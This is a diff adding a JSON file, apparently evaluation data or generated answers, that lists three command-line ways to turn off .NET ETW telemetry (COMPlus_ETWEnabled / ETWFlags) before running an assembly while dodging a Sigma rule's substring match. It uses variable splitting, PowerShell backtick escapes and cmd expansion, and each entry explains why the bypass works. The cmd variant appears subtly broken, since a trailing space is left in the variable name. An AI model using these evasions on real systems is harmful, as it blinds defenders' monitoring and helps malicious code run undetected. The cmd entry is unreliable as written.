@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"$p1='COMPlus_'; $p2='ETWEnabled'; [Environment]::SetEnvironmentVariable($p1+$p2, '0', 'Process'); .\\assembly.exe\"",
+    "explanation": "The Sigma rule relies on an exact substring match. By splitting the target string into separate variables and concatenating them at runtime, the contiguous string 'COMPlus_ETWEnabled' never appears in the process creation command line arguments, evading the rule."
+  },
+  {
+    "output": "powershell.exe -Command \"$env:COMPlus_E`T`WEnabled=0; .\\assembly.exe\"",
+    "explanation": "PowerShell uses backticks as escape characters. The environment variable is evaluated correctly as 'COMPlus_ETWEnabled' internally, but the raw command line logged by the system will contain the literal backticks (e.g., 'COMPlus_E`T`WEnabled'), bypassing the strict 'contains' condition."
+  },
+  {
+    "output": "cmd.exe /c \"set p1=COMPlus_ && set p2=ETWFlags && call set %p1%%p2%=0 && .\\assembly.exe\"",
+    "explanation": "Similar to the PowerShell concatenation bypass, this uses standard Windows command prompt variable expansion to construct the environment variable dynamically. The process creation event for cmd.exe will log the split strings, but not the combined 'COMPlus_ETWFlags' target string."
+  }
+]
